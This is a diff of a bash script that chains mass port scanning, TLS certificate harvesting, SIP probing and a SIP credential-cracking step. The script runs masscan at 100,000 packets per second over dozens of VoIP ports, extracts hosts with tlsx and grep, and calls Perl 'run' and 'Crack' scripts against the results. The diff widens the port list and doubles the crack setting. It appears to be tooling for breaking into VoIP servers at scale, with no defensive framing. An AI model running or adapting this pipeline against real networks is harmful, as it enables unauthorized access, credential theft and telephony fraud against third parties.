@@ -9,9 +9,9 @@ auth => [ $user,$pass ]
 #!/bin/bash
 
 # Scan TLS Port
-sudo masscan -iL ip.txt -p5061  -oL masscan.txt --exclude 255.255.255.255 --rate=100000
-awk '{print $4}' masscan.txt > 5061.txt
-sudo cat 5061.txt | docker run -i projectdiscovery/tlsx -p 5061 -san -cn -nc -v >> TLSxresult.txt
+sudo masscan -iL iprange.txt -p5060,6072,14310,6073,7073,6069,6079,6099,6089,5059,5260,5061,5070,5069,6655,5038,5080,5062,15060,6050,6051,5063,5064,5065,5067,5068,5071,5072,5073,5076,5075,5077,5078,1020,5079,1021,1022,1023,6052,6053,6054,6055,6057,6058,6059,6061,6062,6063,6070,6064,6080,6010,5090,5566,9060,4002,5678,5088,6020,5600,5160,1025,9090,5506,6060 -oL masscan.txt --exclude 255.255.255.255 --rate=100000
+awk '{print $4 ":" $3}' masscan.txt > 5061.txt
+sudo cat 5061.txt | docker run -i projectdiscovery/tlsx -san -cn -nc -v >> TLSxresult.txt
 
 echo -e "\nEnding Scan TLS !\n"
 
@@ -19,6 +19,9 @@ echo -e "\nEnding Scan TLS !\n"
 
 echo -e "\nStart IP Extractor ...\n"
 
+grep -Po "(\d+\.){3}\d+:?(\d?){7}" TLSxresult.txt >>cn1
+grep -R ':' cn1 >cn2
+awk '!a[$0]++' cn2 >IPScn
 grep -oP  "(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]" TLSxresult.txt >>cn1
 sed '/:[0-9]*$/ ! s/$/:5061/' cn1 >>ccn
 grep -R ':' ccn >cn2
@@ -29,7 +32,6 @@ sudo rm cn2
 sudo rm cnD
 sudo rm cnDD
 sudo rm ccn
-sudo rm 5061.txt
 sleep 1
 
 echo -e "\nEnding IP Extractor !\n"
@@ -38,8 +40,9 @@ echo -e "\nEnding IP Extractor !\n"
 
 echo -e "\nStart SIP responses ...\n"
 
+sudo cat IPScn IPS >> IPS
 perl run IPS
-cat SSL.pal 403.pal 404.pal 401.pal >> IPss
+cat SSL.pal >> IPss
 sleep 1
 
 echo -e "\nEnding SIP responses !\n"
@@ -48,7 +51,7 @@ echo -e "\nEnding SIP responses !\n"
 
 echo -e "\nStart SIP Crack ...\n"
 
-perl Crack 1000 2 IPss
+perl Crack 2000 2 IPss
 sudo rm *.pal
 sleep 1
 
